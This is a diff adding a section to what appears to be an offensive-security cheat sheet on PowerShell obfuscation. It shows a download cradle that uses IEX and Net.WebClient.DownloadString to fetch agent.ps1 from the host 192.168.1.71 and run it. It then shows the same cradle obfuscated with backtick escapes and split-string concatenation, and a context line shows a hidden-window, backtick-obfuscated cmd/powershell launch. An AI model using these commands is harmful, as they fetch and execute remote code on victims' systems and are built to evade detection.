@@ -52,4 +52,15 @@ cm\`d.e\`xe /c po\`w\`er\`shel\`l.ex\`e -n\`op -w\`i\`nd h\`idd\`en -Ex\`e\`c B\
 
 ---
 
+- string command to obfuscate<br />
+`powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.71/agent.ps1')`<br />
+The above string can be obfuscated using **powershell escape caracters** ` and + <br />
+
+- string obfuscated<br />
+
+      $get = New-Object "N\`et\`Web\`Cl\`ie\`nt"
+      p\`owe\`r\`shel\`l.exe IEX ($get).D\`ow\`n\`loa\`dSt\`rin\`g('h'+'t'+'tp'+':'+'//'+'192.168.1.71/agent.ps1')<br />
+
+---
+
 <br />
